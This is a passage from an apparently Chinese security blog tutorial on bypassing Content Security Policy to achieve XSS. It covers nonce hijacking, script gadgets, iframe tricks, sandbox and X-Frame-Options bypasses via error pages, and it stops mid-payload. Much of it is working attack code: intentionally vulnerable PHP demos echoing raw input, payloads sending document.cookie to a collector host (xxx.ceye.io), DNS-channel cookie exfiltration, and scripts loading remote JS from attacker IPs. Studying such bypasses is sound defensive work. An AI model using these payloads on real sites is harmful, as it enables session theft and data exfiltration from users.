<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.248.1/a.js"</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure>
<p>最终形成如下页面结构：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.248.1/a.js"</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script id="</span><span class="attr">aa</span>" <span class="attr">nonce</span>=<span class="string">"xxx"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。</p>
<p>还有一个注意点，上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。</p>
<p><strong>Demo</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">	&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">		echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; nonce=&lt;?php echo $nonce;?&gt;&gt;document.write(&quot;Mi1k7ea&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>当我们输入<code>&lt;script src=&quot;http://192.168.43.201/a.js&quot; a=&quot;</code>时即会弹框：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/1.png" alt=""></p>
<p>查看元素，看到输入的script标签的a属性的双引号将后面含有nonce的script标签第一个含有双引号的属性都给闭合了，成功劫持了nonce属性进而加载外部JS弹框：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/2.png" alt=""></p>
<p>值得注意的就是，要想成功利用在nonce属性前需要存在一个用引号括起来的属性，不然会失效。</p>
<p>另外，在之前做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：<a href="https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/" target="_blank" rel="noopener">一道绕过CSP的XSS题目</a></p>
<h3 id="6、利用Gadgets和strict-dynamic-unsafe-eval绕过"><a href="#6、利用Gadgets和strict-dynamic-unsafe-eval绕过" class="headerlink" title="6、利用Gadgets和strict-dynamic/unsafe-eval绕过"></a>6、利用Gadgets和strict-dynamic/unsafe-eval绕过</h3><p>即重用Gadgets代码来绕过CSP，具体可参考Black Hat 2017的<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">ppt</a>，上面总结了可以被用来绕过CSP的一些JS库。</p>
<p>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：<a href="https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/" target="_blank" rel="noopener">一道绕过CSP的XSS题目</a></p>
<h3 id="7、利用iframe绕过"><a href="#7、利用iframe绕过" class="headerlink" title="7、利用iframe绕过"></a>7、利用iframe绕过</h3><h4 id="（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP："><a href="#（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：" class="headerlink" title="（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP："></a>（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"B"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>下面简单地搞个示例。</p>
<p>1.php代码，有CSP限制，但可以通过iframe加载同源的页面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; frame-src &apos;self&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;1.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">	&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">		echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>2.php简单写为<code>&lt;script&gt;alert(&#39;Mi1k7ea&#39;)&lt;/script&gt;</code>。</p>
<p>在访问1.php时，直接输入script标签是无法执行弹框的，但可以通过iframe引入同源的2.php来执行该页面的JS代码，输入<code>&lt;iframe src=&#39;http://127.0.0.1/2.php&#39;&gt;&lt;/iframe&gt;</code>：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/8.png" alt=""></p>
<h4 id="（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http-xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库："><a href="#（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http-xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：" class="headerlink" title="（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库："></a>（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a href="http://xxx" target="_blank" rel="noopener">http://xxx</a>“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">csp</span>=<span class="string">"script-src 'unsafe-inline'"</span> <span class="attr">src</span>=<span class="string">"http://xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="（3）绕过sandbox："><a href="#（3）绕过sandbox：" class="headerlink" title="（3）绕过sandbox："></a>（3）绕过sandbox：</h4><p><strong>情景1——未开启X-Frame-Options:DENY</strong></p>
<p>Demo代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups&quot;);</span><br><span class="line">	setcookie(&apos;milk&apos;,&apos;tea&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;script&gt;&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>当CSP设置为allow-popups开启时，window.open等就可以打开新的窗口，这时直接就能利用了，直接输入如下内容就能顺利地带出cookie信息（在URL栏输入前记得先进行URL编码）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?xss=window.open(&apos;//xxx.ceye.io/?&apos;+escape(document.cookie))</span><br><span class="line">或</span><br><span class="line">?xss=window.location.href=&apos;http://xxx.ceye.io/?cookie=&apos;+document.cookie</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/9.png" alt=""></p>
<p>这里加载同源的js文件是没有问题的，其中a.js的代码为alert(1)，构造如下：：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss=f=document.createElement(&quot;script&quot;);f.src=&quot;http://127.0.0.1/a.js&quot;;document.body.appendChild(f);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/10.png" alt=""></p>
<p>但是有个问题，要是远程加载JS文件是不满足CSP规则的。这里我们换个源就知道了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss=f=document.createElement(&quot;script&quot;);f.src=&quot;http://127.0.0.1:8000/a.js&quot;;document.body.appendChild(f);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/11.png" alt=""></p>
<p>显示拒绝加载了，因为CSP中有一条default-src ‘self’的规则限制了。</p>
<p><strong>这里可以通过iframe引入外部js，将src设置为同域的，从而绕过CSP的default-src ‘self’规则。</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">f.id=<span class="string">"pwn"</span>;</span><br><span class="line">f.src=<span class="string">"./test.txt"</span>;</span><br><span class="line">f.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    x.src=<span class="string">'//127.0.0.1:8000/a.js'</span>;                  </span><br><span class="line">    pwn.contentWindow.document.body.appendChild(x)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(f);</span><br></pre></td></tr></table></figure>
<p>没有问题，成功引入外部js弹框：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/12.png" alt=""></p>
<p>当然也能把浏览器的数据带出来，引用外部新的c.js：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&apos;//xxx.ceye.io/?&apos;+escape(document.cookie))</span><br></pre></td></tr></table></figure>
<p>输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss=f=document.createElement(%22iframe%22);f.id=%22pwn%22;f.src=%22./test.txt%22;f.onload=()=%3E&#123;x=document.createElement(%27script%27);x.src=%27//192.168.17.148:81/c.js%27;pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/13.png" alt=""></p>
<p>这里没有出现网上博客说的带不回的问题。</p>
<p><strong>下面也可以尝试使用DNS通道来传递cookie。</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dc = <span class="built_in">document</span>.cookie;</span><br><span class="line">dcl = dc.split(<span class="string">";"</span>);</span><br><span class="line">m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"HEAD"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;dcl.length;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">console</span>.log(dcl[i]);</span><br><span class="line">m.innerHTML = m.innerHTML + <span class="string">"&lt;link rel=\"preconnect\" href=\"//"</span> + <span class="built_in">escape</span>(dcl[i].replace(<span class="regexp">/\//g</span>, <span class="string">"-"</span>)).replace(<span class="regexp">/%/g</span>, <span class="string">"_"</span>) + <span class="string">'.'</span> + location.hostname.split(<span class="string">"."</span>).join(<span class="string">""</span>) +  <span class="string">".xxx.ceye.io\"&gt;"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(m.innerHTML);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在URL栏输入的时候记得进行URL编码，然后就可以看到打到cookie了：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/14.png" alt=""></p>
<p>除此之外，我们还可以获取页面中父窗口标签的内容，在php代码中加上id为secret的标签内容，注意标签必须放在获取URL参数的script标签之上，否则会报错找不到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups; &quot;);</span><br><span class="line">	setcookie(&apos;milk&apos;,&apos;tea&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;code id=&apos;secret&apos;&gt;P4ssw0rd&lt;/code&gt;</span><br><span class="line">	&lt;script&gt;&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>改下第一行的内容获取id为secret的父窗口标签即可：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dc = top.document.getElementById(<span class="string">"secret"</span>).innerHTML;</span><br><span class="line">dcl = dc.split(<span class="string">";"</span>);</span><br><span class="line">m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"HEAD"</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;dcl.length;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">console</span>.log(dcl[i]);</span><br><span class="line">m.innerHTML = m.innerHTML + <span class="string">"&lt;link rel=\"preconnect\" href=\"//"</span> + <span class="built_in">escape</span>(dcl[i].replace(<span class="regexp">/\//g</span>, <span class="string">"-"</span>)).replace(<span class="regexp">/%/g</span>, <span class="string">"_"</span>) + <span class="string">'.'</span> + location.hostname.split(<span class="string">"."</span>).join(<span class="string">""</span>) +  <span class="string">".xxx.ceye.io\"&gt;"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(m.innerHTML);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接打到父窗口标签内容：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/15.png" alt=""></p>
<p><strong>情景2——开启X-Frame-Options:DENY</strong></p>
<p>如果header中添加了X-Frame-Options:DENY，则不能如此直接地利用前面的exp。</p>
<p>这里换个示例：<a href="http://hsts.pro/csp.php" target="_blank" rel="noopener">http://hsts.pro/csp.php</a></p>
<p>访问，默认弹框显示welcome，可以看到站点是开了X-Frame-Options:DENY的：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/16.png" alt=""></p>
<p>查看页面源码，可以看到和之前的是差不多的，在xss参数中获取URL输入然后嵌入script标签中，其中还含有id为secret的标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/css/bootstrap-theme.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp"</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center-block"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"Welcome"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span> <span class="attr">id</span>=<span class="string">'secret'</span>&gt;</span>Secret: iGWmT7P2YlYNytnE<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可使用CSP的第二个常见错误，即在返回Web扫描程序错误时没有提供保护性头部。若要验证这一点，最简单方法是尝试打开并不存在的网页。因为许多资源只为含有200代码的响应提供了X-Frame-Options头部，而没有为包含404代码的响应提供相应的头部。</p>
<blockquote>
<p>为了强制NGINX返回“400 bad request”，你唯一需要做的，就是使用/../访问其上一级路径中的资源。为防止浏览器对请求进行规范化处理，导致/../被/所替换，对于中间的两个点号和最后一个斜线，我们可以使用unicode码来表示。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frame=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">frame.src=<span class="string">"/%2e%2e%2f"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br></pre></td></tr></table></figure>
<p>直接在控制台插入即可，当然也可以通过xss参数输入：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/17.png" alt=""></p>
<p>上payload获取父窗口标签内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">frame.src=<span class="string">"/%2e%2e%2f"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br><span class="line">frame.id=<span class="string">"pwn"</span>;</span><br><span class="line">frame.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    x.src=<span class="string">'data:,alert("Pwned "+top.secret.textContent)'</span>;</span><br><span class="line">    pwn.contentWindow.document.body.appendChild(x)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/20.png" alt=""></p>
<p>当然，也可以访问不存在的页面，造成404错误，注意会弹两次框：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">frame.src=<span class="string">"/noexist.txt"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br><span class="line">frame.id=<span class="string">"pwn"</span>;</span><br><span class="line">frame.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    x.src=<span class="string">'data:,alert("Pwned "+top.secret.textContent)'</span>;</span><br><span class="line">    pwn.contentWindow.document.body.appendChild(x)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/22.png" alt=""></p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/21.png" alt=""></p>
<p><strong>第二种让Web服务器返回错误的方法是让URL超过所允许的长度。</strong></p>
<p>例如NGINX和Apache等Web服务器的默认URL长度通常被设置为不超过8kB。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">frame.src=<span class="string">"/"</span>+<span class="string">"A"</span>.repeat(<span class="number">20000</span>);</span><br><span class="line">frame.id=<span class="string">"pwn"</span>;</span><br><span class="line">frame.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    x.src=<span class="string">'data:,alert("Pwned "+top.secret.textContent)'</span>;</span><br><span class="line">    pwn.contentWindow.document.body.appendChild(x)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(frame);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/18.png" alt=""></p>
<p><strong>第三种欺骗服务器返回错误的方法是触发cookie长度限制。</strong></p>
<p>这是因为当前浏览器支持的cookie越来越长，已经超出了Web服务器所能处理的范围。</p>
<p>1、创建一个巨型的 cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;5;i++)&#123;document.cookie=i+”=”+”a”.repeat(4000)&#125;;</span><br></pre></td></tr></table></figure>
<p>2、使用任何地址打开iframe，都会导致服务器返回错误（通常没有XFO或CSP）</p>
<p>3、删除巨型cookie：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;5;i++)&#123;document.cookie=i+”=”&#125;</span><br></pre></td></tr></table></figure>
<p>4、将自己的js脚本写入frame中，用以窃取其父frame中的秘密信息。</p>
<p>payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;<span class="built_in">document</span>.cookie=i+<span class="string">"="</span>+<span class="string">"a"</span>.repeat(<span class="number">4000</span>)&#125;;</span><br><span class="line">f=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">f.id=<span class="string">"pwn"</span>;</span><br><span class="line">f.src=<span 